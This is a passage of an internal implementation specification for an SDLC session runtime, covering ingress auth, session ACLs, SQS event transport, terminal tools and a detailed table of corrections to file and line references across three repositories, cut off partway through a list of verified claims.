# SDLC Runtime Execution — Implementation Spec, Part 1: Foundation

**Status:** Implementation specification. Derived from `sdlc-runtime-execution-architecture.md` (the "architecture doc"), whose *shape* is approved. This document does not re-architect; where the architecture doc is wrong about the code, this document says so and gives the corrected instruction.

**Audience:** an engineer or coding agent implementing without access to the architect. Every task states the files it touches, the tests to write first, and a binary acceptance check.

**Scope of this part:**

| | Covered here |
|---|---|
| Section A | Shared contracts — ACL, four inbound HTTP endpoints, outbound event envelope + event set, the two terminal tools, instruction injection, the non-interactive session profile |
| Phase 0 | Free cleanups (architecture §6 Phase 0, §1.4, §1.5) |
| Phase 1 | Prove the auth path against the live runtime (§1.3, §2.1, §6 Phase 1) |
| Phase 2 | Session create/read over HTTP, no events (§2.1, §2.3, §6 Phase 2) |
| Phase 3 | SQS FIFO event transport, consumer Lambda, DLQ, `runtimeEvents.mapSessionEvent` (§2.4, §2.5, §6 Phase 3) |

**Not covered here — see Part 2** (`sdlc-runtime-impl-spec-part2-cutover.md`, written separately): Phase 4 (engineering step cutover), Phase 4b (`ENGINEERING_FAILED`), Phase 5 (planning as a session), Phase 6 (QA as a session), Phase 7 (deletes). Section A is normative for Part 2 as well — Part 2 references these contracts rather than restating them.

**Revision 6 — brought current against shipped code on 2026-09-26.** Phases 0–3 have shipped. This revision corrects the document in place so that it specifies what was actually built; it is still an implementation specification, not a changelog, and the body below is the corrected spec rather than a record of the correction. **Where an earlier revision's reasoning survived contact with implementation it is untouched.** Six decisions did not, and each is corrected at its own section rather than only here:

- **Ingress is a bearer token the runtime verifies itself, not mTLS.** The ALB rule is on the **existing :443 listener at priority 6**, matching `/v1/sdlc/*` **and** an `Authorization: Bearer *` header, above an **unconditional priority-8 deny** that closes the namespace to browsers. mTLS is retained as an **implemented but inactive** `sdlc_ingress_mode = "mtls"` — a second :8443 listener, a trust store, a client-certificate secret — and is not the operated mode. **§0.9.1 is rewritten; Phase 1 is rewritten.**
- **There was never a CA ceremony, and mTLS was never infeasible.** Every passage prescribing a hand-rolled CA, an S3 trust-store bundle, a hand-populated certificate secret or a leaf-expiry alarm is struck. **The manual step was a property of our own Terraform** — we declined to write a `secret_version` for the private key — **not of mutual TLS.** AWS Private CA self-signs a root entirely in Terraform (`aws_acmpca_certificate_authority` → `aws_acmpca_certificate` → `aws_acmpca_certificate_authority_certificate`), and the `tls` provider can act as the CA for nothing. **Both were declined on cost.** Do not carry forward the stronger claim; it is false, and designing against it would be designing against a constraint that does not exist.
- **No SDK release is on the critical path, and the one change this document made load-bearing was declined on merit.** There is no `4.0.2`. **Both consumers pin `4.0.1`**: `nevado-sherpa-tui`'s `pnpm-lock.yaml` resolves `@nevadoai/sherpa-core` and `-protocol` to `4.0.1`, and Command Center still carries `PINNED_SDK_VERSION = '4.0.1'` in `backend/__tests__/sherpaSdkDriftGuard.test.js` against `^4.0.1` in `frontend/package.json`. One SDK release *did* happen — `sherpa-sdk` #227/#228 widened `SessionApplication` to `'ide' | 'tui' | 'web' | 'sdlc'` — but **nothing waited for it and nothing consumes it**; the runtime casts at its single `manager.create` call site instead. The change this document specified as two lines worth taking, **`sherpa-sdk` #226, "default `createdBy` and `application` on session create instead of forcing them", was authorised and then CLOSED unmerged** — declined because `createdBy` backs a live ownership check in `renameSession`, so relaxing the forcing would let a caller assert ownership of a session it does not own. **The forcing is correct and stays.** An **SDK drift guard** (`apps/runtime/src/sdlc/contract.driftguard.test.ts`) pins the 4.0.1 facts the design rests on. Any dependency chain of the form `sherpa-sdk → runtime → command-center` is **false as a blocking chain**. **BQ3, BQ4, Task 2.0, Task 2.1, §A.5 and §A.8 are corrected.**
- **The three terminal tools live in the runtime, behind 4.0.1's `McpToolProvider` seam**, not in `tool-specs.ts`. **Exactly one of `submitPlan` / `submitReview` / `reportCompletion` is granted per session**, derived from `profile.tools` and enforced by the provider advertising one tool and refusing every other name. `reportCompletion` **verifies** the agent's own commit and push; it does not perform them. **§A.5.1, §A.5.4 and §A.7.3 are corrected.**
- **`createdBy` cannot carry a machine identity, and that is correct.** `SessionManager.create` forces the value, and the field backs a live ownership check in `renameSession`. `createdBy: "m2m:<CN>"` is **not** and **cannot** be written. Under a shared bearer token there is **no per-client identity at all**. The ACL scopes on `application === 'sdlc'`. **§A.3 and its header table are corrected.**
- **Transport is SQS FIFO, published from a `Broadcaster.setObserver` hook, drained by a Go consumer Lambda.** This the document already had right; the residual WebSocket and `seq` language is gone.

**Nothing in this document has been verified running a cycle on AWS.** Every claim below is against source, Terraform configuration and unit tests. The ingress mode defaults to `"none"` and turning it on is a human `workflow_dispatch`.

**Revision 3 — terminal-tool surface re-adjudicated.** An independent architect adjudicated the terminal-tool design cold (`context/specs/terminal-tool-design-decision.md`) and found the decisive fact all earlier revisions missed: **`inputSchema` is never read at runtime — there is no schema validator in either repo, and the hand-rolled alternative has already drifted silently in two shipped tools.** Revision 3 keeps **three named tools** (`reportCompletion` typed; `submitPlan`/`submitReview` with `payload: unknown`) and adds an optional **`resultSchema`** on the create request, executed generically, so in-session enforcement returns without any Command Center vocabulary entering the runtime. **§0.6 is that delta**, and **§0.7 records where revision 3 itself went wrong**: it concluded the `ApplicationDetail.jsx` plan dialog was dead code and prescribed deleting it, on the strength of a grep that cannot see a setter passed as a prop. It is reachable, the wiring is uncommitted, and Part 2 depends on it — so Task 0.6 is back to the one-word field fix, plus a guard that pins the wiring.

**Revision 2 — reviewed.** The principal architect reviewed revision 1 (`sdlc-runtime-impl-spec-architecture-review.md`), re-verified its load-bearing claims and confirmed all of them. **Six findings and four decisions are applied in this revision. §0.5 is the delta** — read it if you saw revision 1, and read it anyway for the two places this document does not comply and says why. The changes that alter an instruction rather than a rationale:

- **Task 0.5's fix for R0 was broken** and would have blanked the *legacy* activity feed. Rewritten around a shared merge-and-sort selector with behavioural tests.
- **Supersede is create-then-release, not release-then-create.** The branch collision that justified the old ordering does not exist — the runtime has no worktrees.
- **Three named terminal tools — `reportCompletion`, `submitPlan`, `submitReview` — with the plan and review payloads typed `unknown`.** No Command Center business field enters the runtime's protocol package or its tool specs. A new optional `resultSchema` on the create request restores in-session enforcement generically.
- **`seq` is gone as durable state**; the FIFO dedup id is a per-envelope UUID.
- **v1's ACL is `application === 'sdlc'`** and needs no SDK change.
- **`applyRuntimeEffect`'s default arm throws**, closing a silent-data-loss path.
- ~~**SDK target is 4.0.2 patched from 4.0.1**, not HEAD.~~ **Struck (revision 6).** There is no 4.0.2 and no SDK release on the critical path — the runtime reaches the deployed 4.0.1 through its `McpToolProvider` seam. See BQ3.
- **New Task 2.2b** builds `GET` and `cancel`, which no earlier task did. **Revision 6 note:** the route shipped, but `cancel` has **no production caller** — Command Center's dispatcher argues "release, never cancel" (§A.2.4's ordering note, and the closing section's `cancel` finding).

**Verification date of this spec:** all file paths, line numbers, live AWS state and cross-repo claims below were verified on **2026-09-23** against working-tree state on branch `develop` at commit `938be378`, and against the live `testing-tooling` AWS account (946774551778); revision 2's additional findings (§0.1.d) were verified on **2026-09-24** against the same commit. Where the architecture doc's references have drifted, §0.1 lists the correction.

---

## 0. Before you write any code

### 0.0 Three repos, not one

The work spans three checkouts. The architecture doc says the runtime server "is not checked out here" (§5.4). **That is wrong — it is checked out.**

| Repo | Path | What lives there | Deploy mechanism |
|---|---|---|---|
| Command Center | `nevadoai/command-center` | Orchestrator, consumer Lambda, Terraform, frontend | GitHub Actions (see §0.3) |
| Sherpa SDK | `nevadoai/sherpa-sdk` | `packages/protocol`, `packages/core` (AgentEngine, tools, PlatformAdapter), `packages/web` | npm publish to `npm.pkg.github.com` |
| Sherpa runtime server | `nevadoai/nevado-sherpa-tui` | `apps/runtime/src` — the Fastify HTTP+WS server that serves `/sessions` and `/ws` | see §0.3 / Phase 1 Task 1.6 |

**Repository names, not local paths, throughout this document.** An earlier revision wrote the runtime as `nevado-sherpa-tui` and cited paths under one person's home directory. `nevado-sherpa-tui` is a local checkout directory name and means nothing to another reader; the repository is **`nevadoai/nevado-sherpa-tui`**, and every reference here uses that. `nevadoai/nevado-sherpa-ide` is the VS Code extension — not relevant to the implementation, but load-bearing in one place: its `/resume` enumerates resumable sessions with `listByStatus('paused')`, which is why the engine must not start emitting `'completed'` (§0.4 BQ3).

**Warning:** a local checkout of `nevado-sherpa-tui` may contain `.claude/worktrees/*` holding full stale copies of the tree. Grep results under that path are duplicates, not real code. Always confirm a hit is under `apps/` or `packages/`.

**Dependency direction that constrains ordering:** `command-center/frontend/package.json:26-28` depends on `@nevadoai/sherpa-protocol`, `@nevadoai/sherpa-commands`, `@nevadoai/sherpa-web` at `^4.0.1`, resolved to `4.0.1` in the root `package-lock.json`. `backend/package.json` has **no** `@nevadoai/*` dependency at all. So:

- Protocol type changes (§A.8) are a **publish-and-bump** cycle across two repos, not an edit.
- The Command Center *backend* cannot import the protocol types. It must restate the contract in plain JS with a drift guard — the pattern `backend/common/sherpaSessions.js` + `backend/__tests__/sherpaSdkDriftGuard.test.js` already establishes. Follow it; do not invent a new one.

### 0.1 Corrections to the architecture doc

The architecture doc claims it was "written against verified repo state on 2026-09-23". Most of its references hold. The following do not. **Where a line number here disagrees with the architecture doc, this table wins.**

#### 0.1.a Factually wrong claims (not just stale numbers)

| # | Architecture doc claim | Reality | Consequence for you |
|---|---|---|---|
| C1 | §1.4: "`expandedRequirements`' shape … plus `generatedBy` stamped by the orchestrator (`index.js:1305-1315`)" | `index.js:1305-1315` is `recordCheckpoint`'s **evidence block, which reads** `expandedRequirements?.generatedBy`. The only writer is `backend/lambda_handlers/engineeringAgent/orchestratorHandler.js:346` — `plan.generatedBy = 'nevado';` (alongside `plan.generatedAt` at `:345`). | The plan payload must NOT carry `generatedBy`. CC stamps it, and must keep stamping it, or `recordCheckpoint`'s evidence goes null. Add `generatedBy` at the point CC persists the plan payload. Part 2 owns this; noted here because §A.5.2 defines the tool and §A.4.3 defines where the plan schema now lives (CC-side, not protocol). |
| C2 | §2.3, §5.4, §6 Phase 2: "`DELETE /sessions/{id}` … **New server work.** No delete/release endpoint exists" | `DELETE /sessions/:id` **already exists** at `nevado-sherpa-tui/apps/runtime/src/routes/sessions.ts:417`. What is true is that no *client* calls it — a repo-wide grep for `DELETE` across `sherpa-sdk/packages/web/src` returns nothing. | Phase 2's release task is **verify and extend** the existing handler (does it prune the worktree? release the concurrency slot? is it idempotent?), not build one. Read it before estimating. |
| C3 | §5.4: "that last list … lives in a repo not checked out here — so it is the part of this estimate with the least evidence behind it" | The runtime repo **is** checked out (§0.0). | Every runtime-side claim in this spec is verified against real code. Nothing below is marked "verify before implementing" on grounds of the repo being absent. |
| C4 | §3.5, §2.6: "`qaAgent/orchestratorHandler.js:288-291` **drops** any comment whose `path`+`line` is not in the PR's real diff" | It does **not** drop them. `orchestratorHandler.js:322-325` pushes them into `fallbackFindings`, which `:331` renders as an `### Additional Findings` section in the review body. | The review payload's findings do not need to guarantee diff-accurate lines to avoid data loss — an inaccurate line degrades to a body line. Do not add a validation that rejects the whole payload over one bad line. Part 2 owns the review payload's schema and its mapping; §A.4.3 establishes that it is CC-side, not protocol. |
| C5 | §2.6 `ReviewCompletion`: "`pulls.createReview` (`:337`) takes `{path, line, body}`" | It takes `{path, line, side: 'RIGHT', body}` (`orchestratorHandler.js:321`), and the current finding shape from the model is `{file, line, severity, issue, context, suggestion}` with severity `'error' \| 'warning'` plus an implicit third (`:312` falls through to `💡`). | Any rename or re-enum of the finding shape is now **entirely a Command Center decision** — the review payload is opaque to the runtime (§A.4.3), so its field names live in CC's `instructions` and in `validateCompletionPayload`. Part 2 owns both halves and can change them in one deploy. This is the clearest concrete benefit of collapsing the tools: the mismatch that used to be a protocol negotiation is now a local edit. |
| C6 | §2.1 item 5 / §6 Phases 1–3: "This repo does not run a plain `terraform apply` — it applies an explicit target list (`.github/workflows/deploy-dev.yml:427+`)… **Every one of these must be added to `deploy-dev.yml`'s `-target=` list**" | Half right, and the missing half will cost you a deploy cycle. `deploy-dev.yml` applies `-var="customer=internal"` (`:351`, `:405`, `:589`) with **426** `-target=` flags across three phased applies (`:419` Core, `:645` DevOps Phase 1, `:822` DevOps Phase 2-4). **Testing is deployed by a different workflow:** `deploy-testing.yml` (added in #766) dispatches `deploy-customer-instance.yml`, which has **zero** `-target=` flags and does a full `terraform plan -out=tfplan` (`:1096`) / `terraform apply -auto-approve tfplan` (`:1131`). | See §0.3. Every new `.tf` resource still needs a `-target=` entry (or it never reaches internal), **and** a full apply in testing will pick it up whether you added the entry or not. That means a missing target is invisible during Phases 1–3 and only surfaces later on internal. Add the targets in the same PR, every time — the project rule stands. |
| C7 | §1.3: "`MAX_CONCURRENT_SESSIONS=10` … the only occurrence of the name in the repo" | True of `command-center`. In the runtime, `nevado-sherpa-tui/apps/runtime/src/config.ts:49` reads it with a default of **5**: `parseInt(process.env.MAX_CONCURRENT_SESSIONS \|\| '5', 10)`. The deployed value 10 comes from cloud-init. | Any local runtime test runs with 5 slots unless you set the env var. Phase 3's concurrency exit criterion needs 2, so this is not blocking — but do not assume 10 locally. |
| C8 | §2.4: "`runtimeEvents.js:56,68,75`" are the hardcoded `stage: 'engineering'` sites | Actual sites are `runtimeEvents.js:56`, **`:67`**, `:75`. `:68` is `message:`. | Cosmetic, but the Phase 3 edit touches three lines and you should know which. |
| C9 | §2.4 event set: `{ type: 'toolStart'; tool; input }` etc. | Every `ServerMessage` variant except `connected` and `pong` carries a **mandatory `sessionId: string`** (`sherpa-sdk/packages/protocol/src/messages.ts:3-29`). The architecture doc omits it from all seven event shapes. | §A.4.2 restates the union with `sessionId` where it belongs. The envelope also carries `sessionId`; the events inside a batch are all from one session, so per-event `sessionId` is redundant on the wire. §A.4.2 specifies which one is authoritative. |
| C10 | §2.4: "`sessionStatus` … `status: 'active'\|'paused'\|'completed'\|'queued'`" and §3.3 "a **union addition** to `SessionStatus` (`session.ts:1`)" | Correct that `SessionStatus` is `'active' \| 'paused' \| 'completed'` (`session.ts:1`) and `'queued'` is new. But note `HealthResponse` **already** has `queuedSessions: number` (`api.ts:54-60`, which also has an undocumented fifth field `activePtySessions?`). | There is already a queue concept server-side. Phase 3 Task 3.9 must find it rather than invent it. |
| C11 | §2.6 / §4.3 paths: `tool-specs.ts`, `tool-metadata.ts` under `engine/tools/` | Both are at `sherpa-sdk/packages/core/src/tool-specs.ts` and `sherpa-sdk/packages/core/src/tool-metadata.ts` — **not** under `engine/tools/`. Also `PLAN_BLOCKED_TOOLS` is a `Set`, not an object: `tool-specs.ts:522` → `export const PLAN_BLOCKED_TOOLS = new Set(['editFile', 'writeFile']);`, additionally enforced inside `getToolConfig` at `:532`. | Part 2 / the SDK tasks edit a `Set`. |
| C12 | §4.4: "`isAutoApprovedCommand`'s default allowlist (`auto-approve.ts:8-24`)" and "`auto-approve.ts:5`… its own docblock calls itself 'a security boundary'" | Allowlist at `:8-24` ✓ (50 patterns). `matchesPattern` startsWith at `:33` ✓. Splitter at `:38` ✓. But **`isAutoApprovedCommand` is at `:36`, not `:5`** — `:5` is a comment line. File is 44 lines total. | Phase 0's splitter fix targets `:38`. |
| C13 | §2.2: `"overwrite:header.X-Nevado-Client-Id" = "$context.authorizer.claims.client_id"` | For an HTTP API (`aws_apigatewayv2_*`) JWT authorizer the claim namespace is `$context.authorizer.claims.<name>`; there is no `jwt.` segment in the mapping-expression form even though the Lambda-proxy event shape nests it under `.jwt.claims`. The architecture doc's expression is **correct**; flagged here only because `backend/common/tenantHelpers.js:12` reads `event.requestContext?.authorizer?.jwt?.claims`, and the two forms differing will look like a bug. | No change. Do not "fix" one to match the other. |
| C14 | §1.4: cycle-record line refs `startedAt (:1089)`, `currentIteration (init 1, :1090)`, `maxIterations (:1091)`, record at `:1067-1104` | Record is `index.js:1068-1105`. `startedAt` **`:1091`**, `currentIteration` **`:1093`**, `maxIterations` **`:1094`**, `stage` `:1090`, `status` `:1089`, `progressLog: []` `:1096`. | Phase 0 Task 0.5's guard test asserts by name, not line, so this is informational. |
| C15 | §3.3/§3.4: "`index.js:1857`'s guard (`!cycle.pullRequest?.number`)" | The guard is at **`:1858`**. Surrounding refs also shift by 1–4: 422 fallback `:1881-1901` (doc: 1881-1899), hard-FAILED `:1903-1908` (doc: 1903-1907), routing `:1916-1928` (doc: 1918-1932), conditional persist `:1936-1943` (doc: 1934-1941). The completion sequence spans `:1839-1943` (doc: 1839-1941) — **`:1943`, not `:1945`; see the boundary note in Task 3.3, where Part 2 correctly disputed an earlier revision of this row.** | Part 2 owns the extraction. Cited here because Phase 3 Task 3.3 moves the surrounding module. |
| C16 | §5.1: "`agentDrivenOrchestrator/index.js:1412-1534` (`expandBusinessGoals`)" and §5.1 "`handleRequestRevision` (`index.js:4870`)" | `expandBusinessGoals` starts at `:1412` ✓. `handleRequestRevision` starts at **`:4871`**. | Part 2. |
| C17 | §2.1 Option A: "`HTTP_PROXY`… would be the repo's first" | Confirmed (see §0.3 / Phase 1). Recorded as verified, not drifted. | — |

#### 0.1.b Runtime-side corrections — the ones that change the design

These were unverifiable when the architecture doc was written because it believed the runtime repo was absent (§0.1.a C3). Several of them change what Section A can ask for. **Read all of them before Phase 2.**

| # | Architecture doc claim | Reality | Consequence |
|---|---|---|---|
| C18 | §2.2: the read ACL "the human path has no equivalent — it scopes by `userId` from the ALB's `x-amzn-oidc-data` header" | **There is no authentication and no authorization anywhere in the runtime.** `apps/runtime/src/index.ts:91-100` is the entire auth layer, and both branches assign the literal `req.userId = 'dev-user'`. A grep across `apps/` and `tools/` for `x-amzn-oidc`, `oidc-data`, `oidc-identity`, `authorization`, `bearer`, `sigv4` finds only TODO comments (`index.ts:56`, `:97`, `routes/sessions.ts:374`) and one outbound `Authorization: Bearer` to GitHub (`github-token.ts:65`). `req.userId` is read in exactly **one** place — `ws/handler.ts:14` — and only echoed back in the `connected` frame. **No HTTP route handler reads it at all.** `GET /sessions` says so in a comment (`routes/sessions.ts:374-376`: *"TODO(multi-tenant): scope to the authenticated user once SigV4 auth lands"*). `nevado-sherpa-tui/docs/RUNTIME_API.md:104-107` states it outright: *"Authenticated is not identified."* | The `createdBy`-scoped ACL in §A.3 will be **the first authorization in this service.** It cannot piggyback on anything. This is a larger Phase 2 task than the architecture doc implies. §A.3 is rewritten accordingly. |
| C19 | §2.2: "The session is stamped `createdBy: \"m2m:<client_id>\"`" | **A caller cannot set `createdBy`.** `SessionManager.create` forces it: `createdBy: this.userId` at `sherpa-core@4.0.1 src/session-manager.ts:759`, inside a block that comes **after** the `...options` spread and is commented "forced (un-overridable)". `this.userId` is the hardcoded `'dev-user'` from `apps/runtime/src/index.ts:61`. So today **every session has the same `createdBy`** and scoping by it partitions nothing. | **Blocking for the ACL.** Phase 2 Task 2.4 must either construct a per-request `SessionManager` with a real `userId`, or add a `createdBy` write path to the SDK. Costed in Phase 2. |
| C20 | §2.3: `POST /sessions` response `202` | The existing handler returns **`201`** with `{sessionId}` only, on both arms (`routes/sessions.ts:347`, `:370`). | §A.2.1 specifies `201`, not `202`. Do not change the human path's code. |
| C21 | §2.3 / §3.3: "Create returns 202 with `status: 'queued'`" | **Not reachable as written.** `POST /sessions` fires the turn without awaiting it (`sessions.ts:343`, `:366`: `worker.startSession(...).catch(...)`) and returns `201` immediately — **before** the concurrency gate is ever evaluated. The gate is inside `AgentWorker.startSession` (`agent/worker.ts:134-136`), and overflow parks the caller on a bare promise pushed onto an **in-memory** `Array<() => void>` (`worker.ts:41`) with no timeout and no depth cap. A queued session was already persisted with `status: 'active'` (forced, `session-manager.ts:758`). | §A.2.1 keeps `status` in the response but specifies how the runtime must derive it — see the note there. This is real Phase 2 work, not a field rename. Also note `worker.cancelSession` does **not** remove a parked resolver from the queue (`worker.ts:235-248`), so a cancelled queued session stays parked until a slot frees. |
| C22 | §2.3 / §3.5: a `commitSha` checkout is "detached, and there is no branch", so the response's `branch` is undefined | **The SDK deliberately does not detach.** `sherpa-core src/git-checkout.ts:42-47` is `['fetch','--depth','1','origin','--',sha]` then `['reset','--hard','FETCH_HEAD']`, and the comment at `:30-32` says why: *"Checking out FETCH_HEAD would leave a DETACHED HEAD, so the resumed agent's commits/branch-detection would misbehave."* HEAD stays on the cloned branch; the branch ref moves. Also `checkoutCommit` (`:56-66`) **never throws** — it returns `false` on an invalid sha or any git failure and the session proceeds against the branch tip. | §A.2.1's `branch`-is-null rule is **wrong and is corrected there**. And §A.5.1's "branch resolution when HEAD is detached" is not needed for this path. But the silent-fallback behaviour is worse than detachment: a bad `commitSha` gives you a session reviewing the wrong code with no error. Phase 2 Task 2.3 must make that loud on the SDLC path. |
| C23 | §2.3: `commitSha` + `baseBranch` on create | **Neither is reachable from `POST /sessions` today.** The create handler clones the branch tip (`agent/workspace.ts:33-47`: one `git clone --depth 1 [-b branch] -- url dir`) and never settles. SHA pinning happens only on **resume**, through `EphemeralCloneSettle` (`sherpa-core src/settle-strategy.ts:54-63`). And there is **no base-branch fetch anywhere** — the only fetch is the single `--depth 1` fetch of that one commit, so `git diff origin/<base>...HEAD` cannot work. | Both are genuinely new runtime work, and `baseBranch` is the harder one. Phase 2 Task 2.3. Part 2 Phase 6 depends on it. |
| C24 | §2.3: "`DELETE /sessions/{id}` … Response `204`. Idempotent" | The handler exists (`routes/sessions.ts:417-439`) and does more than the doc credits — it cancels a live session, destroys the workspace, and releases the GitHub token. But: it returns **`200 {ok: true}`**, not `204`; it is **not idempotent** (a second call is `404`, from the `manager.get` precheck at `:420-422` — note the SDK's own `deleteCore` *is* idempotent, `session-manager.ts:2055`); it destroys the workspace **only when `workspaceType === 'ephemeral'`** (`:428-430`); it **does not await teardown** of the running turn, so `manager.delete` races the engine's terminal `store.save` and the row can be resurrected (`file-session-store.ts:102` `unshift`es an absent id); the concurrency slot frees **asynchronously** in `startSession`'s `finally` (`worker.ts:231`), after DELETE has returned; and it never calls `Broadcaster.cleanup` — which is dead code with **zero callers** (`ws/broadcaster.ts:81-84`), so a 50-message buffer leaks per deleted session for the process lifetime. | §A.2.4 is rewritten against this. Phase 2 Task 2.5 is a real task with five sub-fixes, not a verification. |
| C25 | §3.1 U2: "Whether `nevado-sherpa-tui` forwards `planCreated` to the socket is not checkable from here" | **It is fully wired.** `agent-engine.ts` fires `onPlanCreated` from `executeWritePlan`; `sherpa-core src/agent-runner.ts:222` maps it to `emit({type:'planCreated', sessionId, filePath, content})`; `emit` is `broadcaster.send` (`apps/runtime/src/agent/worker.ts:216`); the variant exists at `protocol/src/messages.ts:22`. **U2 is resolved: yes.** | The real gap is adjacent and worth knowing: `AgentSession.plan?: SessionPlanRef` exists (`protocol/src/session.ts:94`) but its own doc comment says *"Reserved; populated by a follow-up"* and **nothing writes it**. On an ephemeral clone destroyed at teardown, the event is the only durable trace. This is exactly why §A.5.2 makes `submitPlan` the contract and `planCreated` merely a progress signal. |
| C26 | §4.3: the tool allowlist, implying the runtime can shape its own tool set | **The runtime cannot add tools.** `getToolConfig` is not imported anywhere in `apps/runtime`. `buildToolConfig` is **subtractive only**. `AgentEngineOptions` (`agent-engine.ts:104-136` in 4.0.1) and `AgentRunnerDeps` (`agent-runner.ts:102-122`) have no `tools`/`extraTools`/`dispatch` field. Dispatch is a hardcoded `switch` whose default arm hands unknown names to the platform adapter (`agent-engine.ts:801-842`). Neither `ToolDispatcher` nor `ToolContext` is exported from core's public surface even at `sherpa-sdk` HEAD (`packages/core/src/index.ts:9-10` exports only `AgentEngine` and its types). MCP is not a substitute — MCP tools are reached indirectly via the `listMcpTools`/`useMcpTool` meta-tools and never appear to the model as first-class named tools. | **This resolves §0.4 BQ3 in the pessimistic direction.** The terminal tools are a cross-repo SDK release, which is precisely why there are now **two** rather than three and why neither carries an SDLC schema (§0.1.d(1)). Budget for one 4.0.2 release, in Phase 2. |
| C27 | §4.5: `maxTurns: number // default 120 (engine default is 200)` | `maxAgentTurns` is in `SherpaSettings` (`protocol/src/settings.ts:30`, default 200) and is **read by nothing in `apps/runtime`**. The runtime's `getConfig` (`agent/worker.ts:98-102`) returns only `contextWindow`, `firecrawlApiKey`, `awsProfile`, so `EngineConfig.maxTurns` is always `undefined` and the engine falls back to `DEFAULT_MAX_TURNS = 200`. | Honouring `profile.maxTurns` means `getConfig` must start returning it, derived from the session. One line plus a session field. Phase 2 Task 2.4. |
| C28 | §4.1: flipping the global auto-approve settings would make every human session unattended | True, and **worse than stated**: `PUT /v1/workspace/settings` (`routes/settings.ts:24-28`) mutates the process-wide `FileSettingsStore` and writes `~/.config/nevado/settings.json`. Any caller past the ALB can flip `autoApproveAllCommands` for **every session on the box**, human included. | Note it in Task 0.9's runbook entry. The per-session profile must branch inside the callbacks, never touch the store. |
| C29 | — (not claimed) | **The deployed runtime runs `@nevadoai/sherpa-core@4.0.1`, which is 64 commits behind `sherpa-sdk` HEAD** (`v4.0.1` tagged 2026-09-14; HEAD `a1391a3` 2026-09-22; ~13 300 insertions across `packages/core/src` + `packages/protocol/src`). HEAD moved the engine under `packages/core/src/engine/` and extracted `ToolDispatcher`/`ToolContext`. | **Every path in §0.1.c under `engine/`, `engine/tools/` or `tool-context.ts` is a HEAD path and does not exist in the deployed 4.0.1.** In 4.0.1 the same code is inline in `packages/core/src/agent-engine.ts`. `tool-specs.ts` is **byte-identical** between the two, so the tool-addition patch is portable. When you open a file and the line number is wrong by hundreds, check which version you are in. |
| C30 | §1.3: git push credentials are *"host-global, not tied to a human's identity"* | **Half right, and the right half is the one that matters.** Not tied to a human: confirmed, and a machine session with no human behind it can clone, commit and push — architecture doc §1.3's central unverified assumption, now verified empirically. But **acquisition is per-repo and refcounted**, not host-global: `GitHubTokenManager.acquire(repo)` increments `activeRepos` and mints only on the first reference (`github-token-manager.ts:23-34`), and the token is scoped to `Array.from(activeRepos.keys())` (`:62-66`) — the active set, not everything the installation can reach. | Better than host-global, **and it is exactly why the cross-repo exposure in §A.2.4a exists**: the active set is shared across sessions rather than per-session. Also: `registerSessionRoutes` takes `tokenManager?` as **optional** (`routes/sessions.ts:177`), so a route that forgets to acquire compiles and fails only at push time — §A.2.1 makes it mandatory on the SDLC route. |
| C31 | §3.8: *"A TTL sweep is the backstop, not the mechanism"* for workspace reclamation | **The backstop does not exist.** Observed on the box 2026-09-24: **86 of 89 `/workspaces` directories contain a `.git`, oldest dated `2026-06-08`.** Nothing prunes them. `pruneWorktrees` (`git-worktree.ts:222`) is the primitive §3.8 names, and it is unreferenced by `apps/runtime`. | §3.8 describes a safety net as though implemented. **Release-on-supersede is currently the only mechanism, with nothing behind it** — which raises the cost of Task 2.5's release bugs from "a leaked directory the sweep collects" to "a permanently leaked directory". Do not write a task assuming the sweep exists. |
| C32 | — (not claimed) | **A live credential is leaked right now.** `hosts.yml` mtime `2026-09-24 13:44 UTC`, `/health` reporting `activeSessions: 0`, unit up since `2026-09-22 17:04:58`. `doRefresh()` returns early on an empty `activeRepos` (`github-token-manager.ts:63-64`), so a rewrite with zero sessions is **proof of an unpaired `acquire`** — the timer has re-minted a valid push credential every ~50 minutes for two days. | **A missed release leaks a self-renewing push credential, not just a workspace.** §A.2.4a; Task 2.5 raises the release from silent-best-effort to logged-and-surfaced. Worth an issue against `nevado-sherpa-tui` independently of this project, since it is leaking today. |

#### 0.1.c Claims verified correct (do not re-verify; cited so you can trust them)

`runtimeDispatch.js` in full: `mode: 'agent'` at `:45`, the `typeof expandedRequirements === 'string'` bug at `:42-44`, `task.slice(0, 80)` at `:48`. `runtimeEvents.js`: `mapSessionEvent` `:47-101`, `error`→`FAILED` `:77-84`, `buildCompletionEffect` `:113-133` with the `success:false` arm `:114-122`. `index.js`: `writeStatus` `:104-127`, `applyRuntimeEffect` `:140-168`, `routeAfterEngineering` `:175-309` (its conditional `PutCommand` at `:198-204`, only on the `ai-qa` branch), `processPlanGeneration`'s `ConditionExpression` pattern `:1256-1292`, `:1285` `':plan': expandedRequirements`, the runtime branch `:1628-1651`, `approvePlan` `:1544`, `approveCycle` `:1973`, `processSQSCycleExecution` `:1688`, `invokeEngineeringAgent` `:2488`, `invokeQAAgent` `:2516`, `continueDeployIteration` `:3133`, `continueIteration` `:3467`, `retryStalled` `:3931`, `createPullRequest` `:4224`, `approvePullRequest` `:4463`, `mergePullRequest` `:4635`. `sdlcEngine.js`: `applyTransition` `:507`, `strict` throw `:530-532`, unconditional `cycle.status = toStatus` `:544`. `cycleStatuses.js`: 23 statuses `:9-39`, `STALL_THRESHOLD_MS` `:144`, `isStalled` `:157-164`. `progressLogger.js`: `addProgressLog` `:28-60` with the non-idempotent `list_append` at `:43`. `engineeringAgent/orchestratorHandler.js`: `reportProgress` `:89-117` writing `activities`/`currentStage`/`lastActivityAt`, `generatePlan` `:217` with its JSON schema at `:299-321` (field is `approach`, `:303`), `buildEngineeringPrompt` `:550`, `loadEngineeringDocumentation` `:1149`, `loadApplicationCodebase` `:1224`. `CycleProgress.jsx`: `:75` `cycle?.activityLog || cycle?.activities || []`, `:69-71` `cycle.createdAt`, `:149-158` `cycle.iteration`, `:28-58` `mapStatusToStageIndex` with index 3 (`draft_pr`) genuinely unreachable, renderer reading `timestamp`/`message` at `:174-181`. `technicalApproach` appears **only** in `ApplicationDetail.jsx` and nowhere else in the repo. SDK: `SessionStatus` / `SessionCommand` / `SessionApplication` / `TokenUsage` / `createdBy` / `CreateSessionRequest` / `CreateSessionResponse` / `GetSessionResponse` all exactly as described; `DEFAULT_MAX_TURNS = 200` at `agent-engine.ts:44`; `buildToolConfig` at `agent-engine.ts:414-434` (doc said 433); `PauseReason` at `engine-types.ts:54-63`; `onPlanCreated` at `engine-types.ts:32` and `types.ts:110`; `askQuestion` guard at `workspace-tools.ts:17-18`; `writePlan` writing `context/plans/<slug>.md` at `:213` and bypassing `ctx.approval` entirely, firing `onPlanCreated` at `:219`; `ctx.approval` at 